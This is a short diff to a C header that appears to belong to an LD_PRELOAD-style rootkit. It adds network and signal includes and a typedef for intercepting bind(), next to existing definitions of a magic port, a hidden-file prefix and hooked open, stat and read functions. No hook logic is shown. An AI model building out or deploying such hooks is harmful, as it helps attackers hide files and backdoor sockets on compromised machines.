@@ -16,6 +16,9 @@
 #include <fcntl.h>
 #include <sys/ptrace.h>
 #include <sys/wait.h>
+#include <arpa/inet.h>
+#include <signal.h>
+#include <errno.h>
 
 #define MAGIC_PORT 58231
 #define HIDDEN_PREFIX "7fd5bc27_735a_4172-9d66_d94c102fc43f"
@@ -30,5 +33,6 @@ typedef int (*orig_open_t)(const char *, int, ...);
 typedef int (*orig_stat_t)(const char *, struct stat *);
 typedef int (*orig_xstat_t)(int, const char *, struct stat *);
 typedef ssize_t (*orig_read_t)(int, void *, size_t);
+typedef int (*orig_bind_t)(int, const struct sockaddr *, socklen_t);
 
 #endif
